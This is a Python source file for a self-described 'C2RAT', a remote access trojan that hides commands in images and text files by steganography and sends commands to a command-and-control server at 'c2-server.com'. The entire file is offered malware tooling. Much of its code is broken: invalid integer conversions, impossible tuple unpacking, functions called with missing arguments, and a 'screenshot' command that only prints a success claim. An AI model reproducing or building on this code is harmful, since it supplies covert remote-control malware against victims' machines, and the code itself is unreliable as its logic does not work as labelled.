import os
from PIL import Image
import requests
from base64 import b64encode, b64decode
import atexit
from threading import Thread
import webbrowser

# Configuration
API_KEY = "your_api_key"
COMMANDS = {
    "screenshot": "Take a screenshot and upload it",
    "open-browser": "Open a browser with a URL",
}
STEGANOGRAPHY_IMAGES = [("image1.jpg", "payload1"), ("image2.jpg", "payload2")]
SIDE_CHANNELS = {1: ("file1.txt", "payload3"), 2: ("file2.txt", "payload4")}


class Steganography:
    def __init__(self):
        self.image = Image.new("RGB", (512, 512))

    def encode(self, payload, image_path, index):
        """
        Encodes
        :param payload:
        :param image_path:
        :param index:
        :return:
        """
        stego_image = Image.open(image_path)
        pixels = list(stego_image.getdata())
        for i in range(0, len(pixels), 3):
            r, g, b = pixels[i : i + 3]
            payload = bytes(payload, "utf-8")
            pixel_index = (i + index) % (len(pixels))
            if pixel_index < len(payload):
                pixels[pixel_index] = (r, g, b ^ int(payload[pixel_index], 256))
        stego_image.putdata(pixels)
        stego_image.save(image_path)

    def decode(self, image_path):
        stego_image = Image.open(image_path)
        payload = b""
        pixels = list(stego_image.getdata())
        for i in range(0, len(pixels), 3):
            r, g, b = pixels[i : i + 3]
            if i < len(payload):
                payload += bytes([b ^ int(payload[i], 256)], "utf-8")
        return payload.decode()


class SideChannels:
    def __init__(self):
        self.files = {}

    def encode(self, payload, file_path, index):
        stego_file = open(file_path, "rb+")
        original_data = stego_file.read()
        stego_file.seek(index)
        stego_file.write(b64encode(bytes(payload, "utf-8")))
        stego_file.truncate()
        new_data = stego_file.read()
        if original_data != new_data:
            stego_file.close()
            os.remove(file_path)
            with open(file_path, "wb") as f:
                f.write(new_data)

    def decode(self, file_path):
        stego_file = open(file_path, "rb")
        original_data = stego_file.read()
        new_data = original_data
        for index, payload in self.files.items():
            if index < len(new_data):
                encoded_payload = new_data[index : index + 1024]
                try:
                    decoded_payload = b64decode(encoded_payload).decode()
                    payload += decoded_payload
                    new_data = (
                        new_data[:index]
                        + bytes(decoded_payload, "utf-8")
                        + new_data[index + 1024 :]
                    )
                except Exception as e:
                    print("Error decoding payload:", str(e))
        stego_file.close()
        return payload


class C2RAT:
    def __init__(self):
        self.steganography = Steganography()
        self.side_channels = SideChannels()
        self.threads = {}
        self.exit_handler = None

    def encode(self, command):
        encoded_command = b64encode(bytes(command, "utf-8"))
        for i, (image, payload) in enumerate(STEGANOGRAPHY_IMAGES):
            self.steganography.encode(payload, image, i + 1)

        file_path = SIDE_CHANNELS[1][0]
        for index, (file, payload) in SIDE_CHANNELS.items():
            if file == "file1.txt":
                self.side_channels.files[index] = payload
                self.side_channels.encode(payload, file_path, index)

        for i in range(2, 4):
            file_path = SIDE_CHANNELS[i][0]
            for index, (file, payload) in SIDE_CHANNELS.items():
                if file == "file1.txt":
                    self.side_channels.files[index] += b64encode(
                        encoded_command
                    ).decode()

        for i, (image, payload) in enumerate(STEGANOGRAPHY_IMAGES):
            self.steganography.encode(payload, image, i + 1)

    def decode(self):
        """

        :return:
        """
        command = ""
        for i in range(2, 4):
            file_path = SIDE_CHANNELS[i][0]
            payload = self.side_channels.decode(file_path)
            if payload:
                command += payload

        return command

    def execute_command(self, command):
        response = requests.post(
            "http://c2-server.com/api", data={"key": API_KEY, "command": command}
        )
        if response.status_code == 200:
            print("Command executed successfully")
        else:
            print("Error executing command: ", response.text)

    def start_thread(self, command):
        thread = Thread(target=self.execute_command, args=(command,))
        self.threads[command] = thread
        thread.start()

    def stop_thread(self, command):
        if command in self.threads:
            thread = self.threads[command]
            thread.join()
            del self.threads[command]

    def exit_handler(self):
        for command in list(self.threads.keys()):
            self.stop_thread(command)
        for thread in self.threads.values():
            thread.join()

    def start(self):
        atexit.register(lambda: C2RAT.exit_handler(self))

        for image, _ in STEGANOGRAPHY_IMAGES:
            if not os.path.exists(image):
                raise FileNotFoundError(f"The image {image} does not exist.")
        self.steganography.encode("start")
        print("C2RAT started")

    def stop(self):
        for command in list(self.threads.keys()):
            self.stop_thread(command)
        for thread in self.threads.values():
            thread.join()
        print("C2RAT stopped")

    def open_browser(self, url):
        webbrowser.open(url)


# Example usage:
if __name__ == "__main__":
    rat = C2RAT()
    rat.start()

    while True:
        command = input("Enter a command (type 'exit' to quit): ")

        if command == "screenshot":
            for image, _ in STEGANOGRAPHY_IMAGES:
                decoded_payload = rat.steganography.decode(image)
                print(f"Decoded payload from {image}: {decoded_payload}")
            print("Screenshot taken and uploaded")

        elif command == "open-browser":
            url = input("Enter a URL: ")
            rat.open_browser(url)

        elif command == "exit":
            rat.stop()
            break

        else:
            thread_name = str(os.getpid()) + "_" + command
            rat.start_thread(command)
            print("Executing command", command, "in a new thread named", thread_name)
